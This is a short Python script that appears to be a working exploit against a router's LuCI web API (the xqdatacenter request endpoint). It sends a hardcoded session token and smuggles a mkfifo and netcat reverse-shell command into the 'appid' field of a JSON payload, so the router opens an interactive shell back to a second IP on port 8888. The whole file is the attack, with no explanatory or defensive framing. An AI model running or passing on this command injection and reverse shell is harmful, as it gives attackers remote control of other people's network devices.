import requests

server_ip = "192.168.31.1"
client_ip = "192.168.31.190"
token = "3e400ec9cf0ef81af4f37ac042cce98f"

nc_shell = ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} 8888 >/tmp/f;".format(client_ip)

res = requests.post("http://{}/cgi-bin/luci/;stok={}/api/xqdatacenter/request".format(server_ip, token), data={'payload':'{"api":629, "appid":"' + nc_shell + '"}'})

print(res.text)
